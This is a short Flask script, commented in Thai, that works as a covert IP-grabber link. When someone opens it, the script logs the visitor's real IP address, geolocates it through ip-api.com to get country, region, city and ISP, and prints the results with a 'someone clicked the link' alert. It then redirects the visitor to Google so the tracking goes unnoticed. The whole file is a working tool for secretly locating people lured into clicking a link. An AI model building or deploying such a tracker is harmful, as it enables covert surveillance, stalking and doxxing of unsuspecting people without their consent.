from flask import Flask, request, redirect
import requests

app = Flask(__name__)

def get_geo_info(ip):
    if ip.startswith(('127.', '192.168.', '10.')) or ip == 'localhost':
        return {"status": "private"}

    url = f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,query"
    try:
        res = requests.get(url, timeout=5)
        return res.json()
    except:
        return {"status": "fail"}

@app.route('/')
def home():
    # อ่าน Public IP จริงของผู้ใช้ผ่าน Cloud Proxy Header
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    print(f"\n[+] มีคนกดเปิดลิงก์! IP: {user_ip}")

    geo = get_geo_info(user_ip)
    if geo.get('status') == 'success':
        print(f"    - ประเทศ : {geo.get('country')}")
        print(f"    - พื้นที่   : {geo.get('regionName')}, {geo.get('city')}")
        print(f"    - ค่ายเน็ต : {geo.get('isp')} ({geo.get('org')})")

    return redirect("https://www.google.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)